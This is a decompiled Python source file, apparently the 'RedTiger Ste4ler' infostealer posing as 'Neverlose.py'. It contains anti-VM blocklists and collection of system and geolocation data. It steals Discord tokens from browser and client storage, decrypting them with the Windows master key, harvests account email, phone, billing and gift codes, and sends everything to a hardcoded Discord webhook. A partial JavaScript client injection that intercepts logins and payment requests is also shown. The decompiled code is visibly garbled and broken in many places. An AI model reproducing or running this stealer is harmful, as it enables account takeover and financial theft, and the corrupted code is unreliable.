# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: Neverlose.py
# Bytecode version: 3.11a7e (3495)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

def Ant1_VM_4nd_D38ug():
    import os
    import socket
    import requests
    import subprocess
    import uuid
    b14ck_1i5t_u53rn4m35 = ['WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'BrunoPxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg', 'stephpie']
    b14ck_1i5t_h05tn4m35 = ['0CC47AC83802', 'BEE7370C-8C0C-4', 'DESKTOP-ET51AJO', '965543', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42', 'test']
    b14ck_1i5t_hw1d5 = ['671BC5F7-4B0F-FF43-B923-8B1645581DC8', '7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FF577B79-782E-0A4D-8568-B35A9B7EB76B', '08C1E400-3C56-11EA-8000-3CECEF43FEDE', '6ECEAF72-3548-476C-BD8D-73134A9182C8', '49434D53-0200-9036-2500-369025003865', '119602E8-92F9-BD4B-8979-DA682276D385', '12204D56-28C0-AB03-51B7-44A8B7525250', '63FA3342-31C7-4E8E-8089-DAFF6CE5E967', '365B4000-3B25-11EA-8000-3CECEF44010C', 'D8C30328-1B06-4611-8E3C-E433F4F9794E', '00000000-0000-0000-0000-50E5493391EF', '00000000-0000-0000-0000-AC1F6BD04D98', '4CB82042-BA8F-1748-C941-363C391CA7F3', 'B6464A2B-92C7-4B95-A2D0-E5410081B812', 'BB233342-2E01-718F-D4A1-E7F69D026428', '9921DE3A-5C1A-DF11-9078-563412000026', 'CC5B3F62-2A04-4D2E-A46C-AA41B7050712', '00000000-0000-0000-0000-AC1F6BD04986', 'C249957A-AA08-4B21-933F-9271BEC63C85', 'BE784D56-81F5-2C8D-9D4B-5AB56F05D86E', 'ACA69200-3C4C-11EA-8000-3CECEF4401AA', '3F284CA4-8BDF-489B-A273-41B44D668F6D', 'BB64E044-87BA-C847-BC0A-C797D1A16A50', '2E6FB594-9D55-4424-8E74-CE25A25E36B0'
    b14ck_1i5t_1p5 = ['181.214.153.11', '34.121.241.65', '88.132.231.71', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116', '34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151', '195.239.51.59', '192.40.57.234', '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91', '34.105.72.241', '109.74.154.92', '213.33.142.50', '109.74.154.91', '93.216.75.209', '192.87.28.103', '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', '188.105.91.143', '34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97', '34.85.253.170', '23.128.248.46', '35.229.69.227',
    00:e0:4c:d6:86:77 = ['0e:38:e1:85:16:5a', '00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de', '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40', '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01', '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3', '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1', '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de', 'd4:81:d7:ed:25:54', '00:25:90:36:65:38',
    try:
        if os.getlogin() in b14ck_1i5t_u53rn4m35:
            return True
        if os.getlogin().lower() in [u53rn4m3.lower() for u53rn4m3 in b14ck_1i5t_u53rn4m35]:
            return True
    except:
        pass
    try:
        if socket.gethostname() in b14ck_1i5t_h05tn4m35:
            return True
        if socket.gethostname().lower() in [h05tn4m3.lower() for h05tn4m3 in b14ck_1i5t_h05tn4m35]:
            return True
    except:
        pass
    try:
        if ':'.join(['{:02x}'.format(uuid.getnode() + elements + 255) for elements in range(0, 12, 2)][::(-1)]) in b14ck_1i5t_m4c5:
            return True
    except:
        pass
    try:
        if requests.get('https://api.ipify.org?format=json').json().get('ip', 'None') in b14ck_1i5t_1p5:
            return True
    except:
        pass
    try:
        if subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip() in b14ck_1i5t_hw1d5:
            return True
    except:
        pass
    return False
d3t3ct = Ant1_VM_4nd_D38ug()
except:
    pass  # postinserted
d3t3ct = False
if d3t3ct == True:
    import sys
    sys.exit()
import sys
import os
import socket
import win32api
import requests
import threading
import time

def B10ck_K3y():
    return

def Unb10ck_K3y():
    return

def B10ck_T45k_M4n4g3r():
    return

def B10ck_M0u53():
    return

def B10ck_W3b5it3():
    return

def St4rtup():
    return

def Sy5t3m_Inf0():
    return

def Op3n_U53r_Pr0fi13_53tting5():
    return

def Scr33n5h0t():
    return

def C4m3r4_C4ptur3():
    return

def Di5c0rd_T0k3n():
    return

def Di5c0rd_inj3c710n():
    return

def Br0w53r_5t341():
    return

def R0b10x_C00ki3():
    return

def F4k3_3rr0r():
    return

def Sp4m_0p3n_Pr0gr4m():
    return

def Sp4m_Cr34t_Fil3():
    return

def Shutd0wn():
    return

def Sp4m_Opti0ns():
    return

def R3st4rt():
    return

def Clear():
    try:
        if sys.platform.startswith('win'):
            os.system('cls')
        else:  # inserted
            if sys.platform.startswith('linux'):
                os.system('clear')
    except:
        return None
w3bh00k_ur1 = 'https://discord.com/api/webhooks/1329558791141724281/6Ldg4-KqnJcqkO60rCS7c5HCtS7CbcvAOj95AsVuqUwT-S62lQDLYDmjDoEAlmNa62GX'
website = 'redtiger.shop'
color_embed = 11011333
username_embed = 'RedTiger Ste4ler'
avatar_embed = 'https://cdn.discordapp.com/attachments/1268900329605300234/1276010081665683497/RedTiger-Logo.png?ex=66cf38be&is=66cde73e&hm=696c53b4791044ca0495d87f92e6d603e8383315d2ebdd385aaccfc6dbf6aa77&'
footer_text = 'RedTiger Ste4ler | https://github.com/loxyteck/RedTiger-Tools'
footer_embed = {'text': footer_text, 'icon_url': avatar_embed}
hostname_pc = socket.gethostname()
except:
    pass  # postinserted
hostname_pc = 'None'
username_pc = os.getlogin()
except:
    pass  # postinserted
username_pc = 'None'
displayname_pc = win32api.GetUserNameEx(win32api.NameDisplay)
except:
    pass  # postinserted
displayname_pc = 'None'
ip_address_public = requests.get('https://api.ipify.org?format=json').json().get('ip', 'None')
except:
    pass  # postinserted
ip_address_public = 'None'
ip_adress_local = socket.gethostbyname(socket.gethostname())
except:
    pass  # postinserted
ip_adress_local = 'None'
try:
    response = requests.get(f'https://{website}/api/ip/ip={ip_address_public}')
    api = response.json()
    country = api.get('country', 'None')
    country_code = api.get('country_code', 'None')
    region = api.get('region', 'None')
    region_code = api.get('region_code', 'None')
    zip_postal = api.get('zip', 'None')
    city = api.get('city', 'None')
    latitude = api.get('latitude', 'None')
    longitude = api.get('longitude', 'None')
    timezone = api.get('timezone', 'None')
    isp = api.get('isp', 'None')
    org = api.get('org', 'None')
    as_number = api.get('as', 'None')
except:
    response = requests.get(f'http://ip-api.com/json/{ip_address_public}')
    api = response.json()
    country = api.get('country', 'None')
    country_code = api.get('countryCode', 'None')
    region = api.get('regionName', 'None')
    region_code = api.get('region', 'None')
    zip_postal = api.get('zip', 'None')
    city = api.get('city', 'None')
    latitude = api.get('lat', 'None')
    longitude = api.get('lon', 'None')
    timezone = api.get('timezone', 'None')
    isp = api.get('isp', 'None')
    org = api.get('org', 'None')
    as_number = api.get('as', 'None')

def Sy5t3m_Inf0():
    import platform, subprocess, uuid, psutil, GPUtil
    import ctypes
    import win32api
    import string, screeninfo
    from discord import SyncWebhook, Embed
    sy5t3m_1nf0 = {platform.system()}
    except:
        pass  # postinserted
    sy5t3m_1nf0 = 'None'
    sy5t3m_v3r5i0n_1nf0 = platform.version()
    except:
        pass  # postinserted
    sy5t3m_v3r5i0n_1nf0 = 'None'
    m4c_4ddr355 = ':'.join(['{:02x}'.format(uuid.getnode() + elements + 255) for elements in range(0, 12, 2)][::(-1)])
    except:
        pass  # postinserted
    m4c_4ddr355 = 'None'
    hw1d = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
    except:
        pass  # postinserted
    hw1d = 'None'
    r4m_1nf0 = round(psutil.virtual_memory().total + 1073741824, 2)
    except:
        pass  # postinserted
    r4m_1nf0 = 'None'
    cpu_1nf0 = platform.processor()
    except:
        pass  # postinserted
    cpu_1nf0 = 'None'
    cpu_c0r3_1nf0 = psutil.cpu_count(logical=False)
    except:
        pass  # postinserted
    cpu_c0r3_1nf0 = 'None'
    gpu_1nf0 = GPUtil.getGPUs()[0].name if GPUtil.getGPUs() else 'None'
    except:
        pass  # postinserted
    gpu_1nf0 = 'None'
    try:
        drives_info = []
        bitmask = ctypes.windll.kernel32.GetLogicalDrives()
        for letter in string.ascii_uppercase:
            if bitmask 1 and 1:
                drive_path = letter + ':\\'
                free_bytes = ctypes.c_ulonglong(0)
                total_bytes = ctypes.c_ulonglong(0)
                ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(drive_path), None, ctypes.pointer(total_bytes), ctypes.pointer(free_bytes))
                total_space = total_bytes.value
                free_space = free_bytes.value
                used_space = total_space + free_space
                drive_name = win32api.GetVolumeInformation(drive_path)[0]
                drive = {'drive': drive_path, 'total': total_space, 'free': free_space, 'used': used_space, 'name': drive_name}
                drives_info.append(drive)
            bitmask = bitmask + 1
        else:  # inserted
            d15k_5t4t5 = '{:<7} {:<10} {:<10} {:<10} {:<20}\n'.format('Drive:', 'Free:', 'Total:', 'Use:', 'Name:')
            for drive in drives_info:
                use_percent = (drive['used'], drive['total']) * 100
                free_space_gb = '{:.2f}GO'.format(drive['free'] + 1073741824)
                total_space_gb = '{:.2f}GO'.format(drive['total'] + 1073741824)
                use_percent_str = '{:.2f}%'.format(use_percent)
                d15k_5t4t5 = d15k_5t4t5 + '{:<7} {:<10} {:<10} {:<10} {:<20}'.format(drive['drive'], free_space_gb, total_space_gb, use_percent_str, drive['name'])
        else:  # inserted
            try:
                pass  # postinserted
            except:
                pass
    except:
        pass  # postinserted
    d15k_5t4t5 = 'Drive:  Free:      Total:     Use:       Name:       \nNone    None       None       None       None     \n'
    try:
        def is_portable():
            try:
                battery = psutil.sensors_battery()
                return battery is not None and battery.power_plugged is not None
            except AttributeError:
                return False
        if is_portable():
            p14tf0rm_1nf0 = 'Pc Portable'
        else:  # inserted
            p14tf0rm_1nf0 = 'Pc Fixed'
    except:
        p14tf0rm_1nf0 = 'None'
    scr33n_number = len(screeninfo.get_monitors())
    except:
        pass  # postinserted
    scr33n_number = 'None'
    embed = Embed(title=f'System Info `{username_pc} \"{ip_address_public}\"`:', color=color_embed)
    embed.add_field(name=':bust_in_silhouette: User Pc:', value=f'```Hostname    : {hostname_pc}\nUsername    : {username_pc}\nDisplayName : {displayname_pc}```', inline=False)
    embed.add_field(name=':computer: System:', value=f'```Plateform     : {p14tf0rm_1nf0}\nExploitation  : {sy5t3m_1nf0} {sy5t3m_v3r5i0n_1nf0}\nScreen Number : {scr33n_number}\n\nHWID : {hw1d}\nMAC  : {m4c_4ddr355}\nCPU  : {cpu_1nf0}, {cpu_c0r3_1nf0} Core\nGPU  : {gpu_1nf0}\nRAM  : {r4m_1nf0}Go```', inline=False)
    embed.add_field(name=':satellite: Ip:', value=f'```Public : {ip_address_public}\nLocal  : {ip_adress_local}\nIsp    : {isp}\nOrg    : {org}\nAs     : {as_number}```', inline=False)
    embed.add_field(name=':minidisc: Disk:', value=f'```{d15k_5t4t5}```', inline=False)
    embed.add_field(name=':map: Location:', value=f'```Country   : {country} ({country_code})\nRegion    : {region} ({region_code})\nZip       : {zip_postal}\nCity      : {city}\nTimezone  : {timezone}\nLatitude  : {latitude}\nLongitude : {longitude}```', inline=False)
    embed.set_footer(text=footer_text, icon_url=avatar_embed)
    w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
    w3bh00k.send(embed=embed, username=username_embed, avatar_url=avatar_embed)

def Di5c0rd_T0k3n():
    import os
    import re
    import json
    import base64
    import requests
    from Cryptodome.Cipher import AES
    from Cryptodome.Protocol.KDF import scrypt
    from win32crypt import CryptUnprotectData
    from discord import SyncWebhook, Embed

    def extr4ct_t0k3n5():
        base_url = 'https://discord.com/api/v9/users/@me'
        appdata_local = os.getenv('localappdata')
        appdata_roaming = os.getenv('appdata')
        regexp = '[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}'
        regexp_enc = 'dQw4w9WgXcQ:[^\\\"]*'
        t0k3n5 = []
        uids = []
        token_info = {}
        paths = {**{'Google Chrome2': 'Discord', 'Google Chrome3': appdata_roaming + '\\discord\\Local Storage\\leveldb\\', 'Google Chrome4': appdata_roaming + '\\discordcanary\\Local Storage\\leveldb\\', 'Google Chrome5': 'Lightcord', 'Epic Privacy Browser': appdata_roaming + '\\Lightcord\\Local Storage\\leveldb\\', 'Microsoft Edge': 'Discord PTB', 'Uran': appdata_roaming + '\\discordptb\\Local Storage\\leveldb\\', 'Yandex': appdata_roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\', 'Brave': appdata_local + '\\Amigo\\User Data\\Local Storage\\leveldb\\', 'Iridium': 'Torch', 'paths': appdata_local + '\\Torch\\User Data\\Local Storage\\leveldb\\', '<code object Br0w53r_5t341 at 0x5569d2abf780, file "Neverlose.py", line 1504>': appdata_local + 'Kometa', '<code object R0b10x_C00ki3 at 0x5569d24a2db0, file "Neverlose.py", line 1810>': appdata_local + '\\Kometa\\User Data\\Local Storage\\leveldb\\', '<code object C4m3r4_C4ptur3 at 0x5569c99ea880, file "Neverlose.py", line 1904>': appdata_local + 'Orbitum', '<code object Op3n_U53r_Pr0fi13_53tting5 at 0x7f0f21cd7d30, file "Neverlose.py", line 1970>': appdata_local + '\\Orbitum\\User Data\\Local Storage\\leveldb\\', '<code object Scr33n5h0t at 0x7f10a14a2b50, file "Neverlose.py", line 1979>': appdata_local + 'CentBrowser', '<code object B10ck_K3y at 0x7f1020018990, file "Neverlose.py", line 2019>': appdata_local + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\', '<code object Unb10ck_K3y at 0x7f10200195c0, file "Neverlose.py", line 2038>': appdata_local + '7Star', '<code object B10ck_M0u53 at 0x7f102001a3d0, file "Neverlose.py", line 2057>': appdata_local + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\', '
        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            _d15c0rd = name.replace(' ', '').lower()
            if 'cord' in path:
                if not os.path.exists(appdata_roaming + f'\\{_d15c0rd}\\Local State'):
                    continue
                for file_name in os.listdir(path):
                    if file_name[(-3):] not in ('log', 'ldb'):
                        continue
                    with open(f'{path}\\{file_name}', errors='ignore') as file:
                        for line in file:
                            for y in re.findall(regexp_enc, line.strip()):
                                t0k3n = decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_master_key(appdata_roaming + f'\\{_d15c0rd}\\Local State'))
                                if validate_t0k3n(t0k3n, base_url):
                                    uid = requests.get(base_url, headers={'Authorization': t0k3n}).json()['id']
                                    if uid not in uids:
                                        t0k3n5.append(t0k3n)
                                        uids.append(uid)
                                        token_info[t0k3n] = (name, f'{path}\\{file_name}')
            else:  # inserted
                for file_name in os.listdir(path):
                    if file_name[(-3):] not in ('log', 'ldb'):
                        continue
                    with open(f'{path}\\{file_name}', errors='ignore') as file:
                        for line in file:
                            for t0k3n in re.findall(regexp, line.strip()):
                                if validate_t0k3n(t0k3n, base_url):
                                    uid = requests.get(base_url, headers={'Authorization': t0k3n}).json()['id']
                                    if uid not in uids:
                                        t0k3n5.append(t0k3n)
                                        uids.append(uid)
                                        token_info[t0k3n] = (name, f'{path}\\{file_name}')
        if os.path.exists(appdata_roaming + '\\Mozilla\\Firefox\\Profiles'):
            for path, _, files in os.walk(appdata_roaming + '\\Mozilla\\Firefox\\Profiles'):
                for _file in files:
                    if _file.endswith('.sqlite'):
                        with open(f'{path}\\{_file}', errors='ignore') as file:
                            for line in file:
                                for t0k3n in re.findall(regexp, line.strip()):
                                    if validate_t0k3n(t0k3n, base_url):
                                        uid = requests.get(base_url, headers={'Authorization': t0k3n}).json()['id']
                                        if uid not in uids:
                                            t0k3n5.append(t0k3n)
                                            uids.append(uid)
                                            token_info[t0k3n] = ('Firefox', f'{path}\\{_file}')
        return (t0k3n5, token_info)

    def validate_t0k3n(t0k3n, base_url):
        return requests.get(base_url, headers={'Authorization': t0k3n}).status_code == 200

    def decrypt_val(buff, master_key):
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:(-16)].decode()

    def get_master_key(path):
        if not os.path.exists(path):
            return
        with open(path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        return CryptUnprotectData(master_key, None, None, None, 0)[1]

    def upload_t0k3n5():
        t0k3n5, token_info = extr4ct_t0k3n5()
        w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
        if not t0k3n5:
            embed = Embed(title=f'Discord Token `{username_pc} \"{ip_address_public}\"`:', description='No discord tokens found.', color=color_embed)
            embed.set_footer(text=footer_text, icon_url=avatar_embed)
            w3bh00k.send(embed=embed, username=username_embed, avatar_url=avatar_embed)
            return
        for t0k3n_d15c0rd in t0k3n5:
            api = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': t0k3n_d15c0rd}).json()
            u53rn4m3_d15c0rd = api.get('username', 'None') + '#' + api.get('discriminator', 'None') or ()
            d15pl4y_n4m3_d15c0rd = api.get('global_name', 'None')
            us3r_1d_d15c0rd = api.get('id', 'None')
            em4i1_d15c0rd = api.get('email', 'None')
            ph0n3_d15c0rd = api.get('phone', 'None')
            c0untry_d15c0rd = api.get('locale', 'None')
            mf4_d15c0rd = api.get('mfa_enabled', 'None')
            try:
                if api.get('premium_type', 'None') == 0:
                    n1tr0_d15c0rd = 'False'
                else:  # inserted
                    if api.get('premium_type', 'None') == 1:
                        n1tr0_d15c0rd = 'Nitro Classic'
                    else:  # inserted
                        if api.get('premium_type', 'None') == 2:
                            n1tr0_d15c0rd = 'Nitro Boosts'
                        else:  # inserted
                            if api.get('premium_type', 'None') == 3:
                                n1tr0_d15c0rd = 'Nitro Basic'
                            else:  # inserted
                                n1tr0_d15c0rd = 'False'
            except:
                n1tr0_d15c0rd = 'None'
            try:
                av4t4r_ur1_d15c0rd = f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{api['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{api['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{api['avatar']}.png"
            except:
                av4t4r_ur1_d15c0rd = avatar_embed
            try:
                billing_discord = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': t0k3n_d15c0rd}).json()
                if billing_discord:
                    p4ym3nt_m3th0d5_d15c0rd = []
                    for method in billing_discord:
                        if method['type'] == 1:
                            p4ym3nt_m3th0d5_d15c0rd.append('CB')
                        else:  # inserted
                            if method['type'] == 2:
                                p4ym3nt_m3th0d5_d15c0rd.append('Paypal')
                            else:  # inserted
                                p4ym3nt_m3th0d5_d15c0rd.append('Other')
                    p4ym3nt_m3th0d5_d15c0rd = ' / '.join(p4ym3nt_m3th0d5_d15c0rd)
                else:  # inserted
                    p4ym3nt_m3th0d5_d15c0rd = 'None'
            except:
                p4ym3nt_m3th0d5_d15c0rd = 'None'
            try:
                gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': t0k3n_d15c0rd}).json()
                if gift_codes:
                    codes = []
                    for g1ft_c0d35_d15c0rd in gift_codes:
                        name = g1ft_c0d35_d15c0rd['promotion']['outbound_title']
                        g1ft_c0d35_d15c0rd = g1ft_c0d35_d15c0rd['code']
                        data = f'Gift: {name}\nCode: {g1ft_c0d35_d15c0rd}'
                        if len('\n\n'.join(g1ft_c0d35_d15c0rd)) - len(data) >= 1024:
                            break
                        codes.append(data)
                    if len(codes) > 0:
                        g1ft_c0d35_d15c0rd = '\n\n'.join(codes)
                    else:  # inserted
                        g1ft_c0d35_d15c0rd = 'None'
                else:  # inserted
                    g1ft_c0d35_d15c0rd = 'None'
            except:
                g1ft_c0d35_d15c0rd = 'None'
            software_name, path = token_info.get(t0k3n_d15c0rd, ('Unknown Software', 'Unknown location'))
            embed = Embed(title=f'Discord Token `{username_pc} \"{ip_address_public}\"`:', color=color_embed)
            embed.set_thumbnail(url=av4t4r_ur1_d15c0rd)
            embed.add_field(name=':file_folder: Path:', value=f'```{path}```', inline=False)
            embed.add_field(name=':package: Software:', value=f'```{software_name}```', inline=True)
            embed.add_field(name=':bust_in_silhouette: Username:', value=f'```{u53rn4m3_d15c0rd}```', inline=True)
            embed.add_field(name=':bust_in_silhouette: Display Name:', value=f'```{d15pl4y_n4m3_d15c0rd}```', inline=True)
            embed.add_field(name=':robot: Id:', value=f'```{us3r_1d_d15c0rd}```', inline=True)
            embed.add_field(name=':e_mail: Email:', value=f'```{em4i1_d15c0rd}```', inline=True)
            embed.add_field(name=':telephone_receiver: Phone:', value=f'```{ph0n3_d15c0rd}```', inline=True)
            embed.add_field(name=':globe_with_meridians: Token:', value=f'```{t0k3n_d15c0rd}```', inline=True)
            embed.add_field(name=':rocket: Nitro:', value=f'```{n1tr0_d15c0rd}```', inline=True)
            embed.add_field(name=':earth_africa: Language:', value=f'```{c0untry_d15c0rd}```', inline=True)
            embed.add_field(name=':moneybag: Billing:', value=f'```{p4ym3nt_m3th0d5_d15c0rd}```', inline=True)
            embed.add_field(name=':gift: Gift Code:', value=f'```{g1ft_c0d35_d15c0rd}```', inline=True)
            embed.add_field(name=':lock: Multi-Factor Authentication:', value=f'```{mf4_d15c0rd}```', inline=True)
            embed.set_footer(text=footer_text, icon_url=avatar_embed)
            w3bh00k.send(embed=embed, username=username_embed, avatar_url=avatar_embed)
    upload_t0k3n5()
inj3c710n_c0d3 = '\nconst args = process.argv;\nconst fs = require(\'fs\');\nconst path = require(\'path\');\nconst https = require(\'https\');\nconst querystring = require(\'querystring\');\nconst { BrowserWindow, session } = require(\'electron\');\n\nconst config = {\n  webhook: \'%WEBHOOK_HERE%\', \n  webhook_protector_key: \'%WEBHOOK_KEY%\', \n  auto_buy_nitro: false, \n  ping_on_run: true, \n  ping_val: \'@everyone\',\n  ip_address_public: \'%IP_PUBLIC%\',\n  username: \'%USERNAME%\',\n  embed_name: \'%EMBED_NAME%\', \n  embed_icon: \'%EMBED_ICON%\'.replace(/ /g, \'%20\'), \n  footer_text: \'%FOOTER_TEXT%\',\n  embed_color: %EMBED_COLOR%, \n  injection_url: \'\', \n  api: \'https://discord.com/api/v9/users/@me\',\n  nitro: {\n    boost: {\n      year: {\n        id: \'521847234246082599\',\n        sku: \'511651885459963904\',\n        price: \'9999\',\n      },\n      month: {\n        id: \'521847234246082599\',\n        sku: \'511651880837840896\',\n        price: \'999\',\n      },\n    },\n    classic: {\n      month: {\n        id: \'521846918637420545\',\n        sku: \'511651871736201216\',\n        price: \'499\',\n      },\n    },\n  },\n  filter: {\n    urls: [\n      \'https://discord.com/api/v*/users/@me\',\n      \'https://discordapp.com/api/v*/users/@me\',\n      \'https://*.discord.com/api/v*/users/@me\',\n      \'https://discordapp.com/api/v*/auth/login\',\n      \'https://discord.com/api/v*/auth/login\',\n      \'https://*.discord.com/api/v*/auth/login\',\n      \'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts\',\n      \'https://api.stripe.com/v*/tokens\',\n      \'https://api.stripe.com/v*/setup_intents/*/confirm\',\n      \'https://api.stripe.com/v*/payment_intents/*/confirm\',\n    ],\n  },\n  filter2: {\n    urls: [\n      \'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json\',\n      \'https://*.discord.com/api/v*/applications/detectable\',\n      \'https://discord.com/api/v*/applications/detectable\',\n      \'https://*.discord.com/api/v*/users/@me/library\',\n      \'https://discord.com/api/v*/users/@me/library\',\n      \'wss://remote-auth-gateway.discord.gg/*\',\n    ],\n  },\n};\n\nfunction parity_32(x, y, z) {\n  return x ^ y ^ z;\n}\nfunction ch_32(x, y, z) {\n  return (x & y) ^ (~x & z);\n}\n\nfunction maj_32(x, y, z) {\n  return (x & y) ^ (x & z) ^ (y & z);\n}\nfunction rotl_32(x, n) {\n  return (x << n) | (x >>> (32 - n));\n}\nfunction safeAdd_32_2(a, b) {\n  var lsw = (a & 0xffff) + (b & 0xffff),\n    msw = (a >>> 16) + (b >>> 16) + (lsw >>> 16);\n\n  return ((msw & 0xffff) << 16) | (lsw & 0xffff);\n}\nfunction safeAdd_32_5(a, b, c, d, e) {\n  var lsw = (a & 0xffff) + (b & 0xffff) + (c & 0xffff) + (d & 0xffff) + (e & 0xffff),\n    msw = (a >>> 16) + (b >>> 16) + (c >>> 16) + (d >>> 16) + (e >>> 16) + (lsw >>> 16);\n\n  return ((msw & 0xffff) << 16) | (lsw & 0xffff);\n}\nfunction binb2hex(binarray) {\n  var hex_tab = \'0123456789abcdef\',\n    str = \'\',\n    length = binarray.length * 4,\n    i,\n    srcByte;\n\n  for (i = 0; i < length; i += 1) {\n    srcByte = binarray[i >>> 2] >>> ((3 - (i % 4)) * 8);\n    str += 